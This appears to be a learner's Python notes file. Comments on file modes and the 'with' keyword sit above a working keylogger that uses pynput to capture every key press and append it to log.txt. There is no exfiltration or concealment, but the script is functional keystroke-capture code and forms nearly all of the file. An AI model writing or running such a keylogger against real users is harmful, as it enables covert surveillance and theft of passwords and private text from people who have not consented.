#file gandling-how to read,write.appending
#r-reading,w-writing,a-appending

#f = open("log.txt", "a")
#f.write("Hello Again")
#f.close()

#listners-listen to keystrokes
#use of the 'with' keyword - release memory and resources automatically

from pynput.keyboard import Listener
def write_to_file(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    if keydata == 'Key.space':
        keydata = ' '
    if keydata == 'Key.shift':
        keydata = ''
    if keydata == "Key.ctrl_l":
        keydata = ""
    if keydata == "Key.enter":
        keydata = "\n"
    if keydata == "Key.backspace":
        keydata = " "
    with open("log.txt", "a") as f:
        f.write(keydata)
with Listener(on_press=write_to_file) as l:
    l.join()

#using pynput you can listen and control your keyboard and mouse

